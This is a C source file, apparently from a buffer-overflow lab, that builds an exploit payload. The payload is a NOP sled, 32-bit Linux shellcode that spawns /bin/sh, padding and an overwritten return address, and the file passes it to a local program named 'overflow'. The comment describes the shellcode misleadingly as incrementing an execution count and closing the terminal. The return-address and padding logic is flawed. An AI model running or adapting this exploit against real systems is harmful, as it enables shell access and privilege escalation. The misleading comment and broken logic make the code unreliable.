#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char *argv[]) {
    // Simplified shellcode to increment execution count and close terminal
    char shellcode[] =
        "\x31\xc0"              // xor    eax,eax
        "\x50"                  // push   eax
        "\x68\x2f\x2f\x73\x68"  // push   0x68732f2f
        "\x68\x2f\x62\x69\x6e"  // push   0x6e69622f
        "\x89\xe3"              // mov    ebx,esp
        "\x50"                  // push   eax
        "\x53"                  // push   ebx
        "\x89\xe1"              // mov    ecx,esp
        "\xb0\x0b"              // mov    al,0xb
        "\xcd\x80"              // int    0x80
        "\x31\xc0"              // xor    eax,eax
        "\xb0\x01"              // mov    al,0x1
        "\x31\xdb"              // xor    ebx,ebx
        "\xcd\x80";             // int    0x80

    int buffer_size = 50;
    int shellcode_size = sizeof(shellcode) - 1; // Exclude null terminator
    int nop_sled_size = buffer_size - 8 - shellcode_size; // -8 for "Hello, "

    // Create the payload
    char payload[buffer_size + 4 + 1]; // Buffer + Return address + null terminator

    // Fill the buffer with NOP instructions
    memset(payload, 0x90, nop_sled_size);

    // Append the shellcode
    memcpy(payload + nop_sled_size, shellcode, shellcode_size);

    // Append padding to align with the return address
    memset(payload + nop_sled_size + shellcode_size, 'A', 8 - shellcode_size % 4);

    // Add the return address pointing to the start of the NOP sled
    void **ret = (void **)(payload + buffer_size);
    *ret = (void *)(payload); // Address of NOP sled

    // Null terminate the payload
    payload[buffer_size + 4] = '\0';

    // Execute the vulnerable program with the payload
    execl("./overflow", "overflow", payload, (char *)NULL);

    return 0;
}
